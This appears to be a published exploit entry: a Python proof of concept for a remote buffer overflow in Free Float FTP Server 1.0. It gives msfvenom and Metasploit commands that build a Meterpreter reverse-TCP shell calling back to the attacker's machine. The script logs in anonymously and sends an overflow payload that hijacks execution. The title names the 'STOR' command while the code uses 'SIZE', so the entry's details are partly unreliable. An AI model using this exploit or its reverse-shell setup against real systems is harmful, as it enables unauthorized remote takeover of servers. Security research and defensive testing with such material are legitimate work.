# Exploit Title: Free Float FTP 1.0 "STOR" Remote Buffer Overflow
# Google Dork: N/A
# Date: 4/26/2019
# Exploit Author: Kevin Randall
# Vendor Homepage:
# Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
# Version: Firmware: Free Float FTP 1.0
# Tested on: Windows XP Professional Service Pack 2
# CVE : N/A

#Generate Shellcode with MSFVenom
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP.OF.LOCAL.MACHINE LPORT=4444 -b '\x00\x0A\x0D' -f python
#Setup listener "use exploit/multi/handler" "set payload windows/meterpreter/reverse_tcp" "set LHOST IP.OF.LOCAL.MACHINE" "set LPORT 4444" "exploit"

#!/usr/bin/python
import socket
from payload import buf
def shell_attack(target_machine, target_port):
    
    shellcode = b'\x90'*20 + buf
    payload = "A"*247+"\xF6\xC1\xB3\x7C"+ shellcode +"C"*(749-len(shellcode))

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ##Add FTP Server IP Here###############
    connect = s.connect((target_machine,target_port))
    #######################################

    s.recv(1024)
    s.send('USER anonymous\r\n')

    s.recv(1024)
    s.send('PASS anonymous\r\n')

    s.recv(1024)
    s.send('SIZE' + payload + '\r\n')

    s.recv(1024)
    s.send('QUIT\r\n')

    s.close()
